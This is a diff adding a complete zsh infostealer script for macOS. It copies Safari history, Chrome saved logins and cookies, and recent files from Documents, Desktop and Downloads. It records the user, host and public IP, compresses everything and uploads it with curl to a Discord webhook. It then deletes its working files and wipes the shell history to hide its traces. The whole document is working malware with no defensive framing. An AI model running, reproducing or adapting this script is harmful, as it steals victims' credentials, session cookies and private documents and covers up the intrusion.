@@ -1,1 +1,78 @@
+#!/bin/zsh
 
+# --- 1. CONFIGURATION ---
+# Replace this with your actual Discord Webhook URL
+WEBHOOK_URL="https://discordapp.com/api/webhooks/1515858036097548418/VYaHlmAcSlF6Cv-t09FodmZZn9TPRsb9GmRATS3W0nz35utbuaf3PhrMofrG8roJz4g_"
+
+# --- 2. DATA COLLECTION ---
+TEMP_DIR="/tmp/mac_loot"
+if [ -d "$TEMP_DIR" ]; then rm -rf "$TEMP_DIR"; fi
+mkdir -p "$TEMP_DIR"
+
+echo "Starting deep collection..."
+
+# A. Browser Data (Safari & Chrome)
+# Safari stores history/cookies in Plists
+SAFARI_DIR="$HOME/Library/Safari"
+CHROME_DIR="$HOME/Library/Application Support/Google/Chrome/Default"
+
+cp "$SAFARI_DIR/History" "$TEMP_DIR/safari_history" 2>/dev/null
+cp "$CHROME_DIR/Login Data" "$TEMP_DIR/chrome_logins" 2>/dev/null
+cp "$CHROME_DIR/Cookies" "$TEMP_DIR/chrome_cookies" 2>/dev/null
+
+# B. User Documents & Desktop (The "Everything" part)
+# Grabbing recent files from Desktop, Documents, and Downloads
+USER_FOLDERS=("$HOME/Documents" "$HOME/Desktop" "$HOME/Downloads")
+for folder in "${USER_FOLDERS[@]}"; do
+    if [ -d "$folder" ]; then
+        # Find files modified in the last 30 days to keep size manageable
+        find "$folder" -type f -mtime -30 -exec cp {} "$TEMP_DIR/" \; 2>/dev/null
+    fi
+done
+
+# C. System Metadata & Identity
+SYS_INFO="🚨 **macOS EXFILTRATION** 🚨
+User: $(whoami)
+Computer: $(hostname)
+OS: $(sw_vers -productVersion)
+IP: $(curl -s https://ipinfo.io/ip)
+Time: $(date)"
+
+echo "$SYS_INFO" > "$TEMP_DIR/identity.txt"
+
+# --- 3. COMPRESSION ---
+ZIP_FILE="/tmp/mac_dump.zip"
+tar -czf "$ZIP_FILE" -C "$TEMP_DIR" . 2>/dev/null
+
+# --- 4. EXFILTRATION (With Size Check) ---
+FILE_SIZE=$(stat -f%z "$ZIP_FILE")
+# Discord limit is ~25MB. We aim for 24MB to be safe.
+MAX_SIZE=$((24 * 1024 * 1024))
+
+if [ "$FILE_SIZE" -lt "$MAX_SIZE" ]; then
+    # Upload the zip file and the identity text
+    curl -X POST -F "payload_json={\"content\": \"🚨 **DATA EXFILTRATED** 🚨\n$SYS_INFO\"}" \
+         -F "file=@$ZIP_FILE" \
+         "$WEBHOOK_URL"
+else
+    # If too big, just send the identity text
+    curl -X POST -H "Content-Type: application/json" \
+         -d "{\"content\": \"🚨 **DATA TOO LARGE FOR DISCORD** 🚨\n$SYS_INFO\"}" \
+         "$WEBHOOK_URL"
+fi
+
+# --- 5. THE "ZERO TRACE" CLEANUP ---
+# Delete the loot folder and the zip file
+rm -rf "$TEMP_DIR"
+rm "$ZIP_FILE"
+
+# Clear the shell history
+history -c
+
+# Wipe the actual history file from the disk
+if [ -f "$HOME/.zsh_history" ]; then
+    echo "" > "$HOME/.zsh_history"
+fi
+
+# Exit the process
+exit
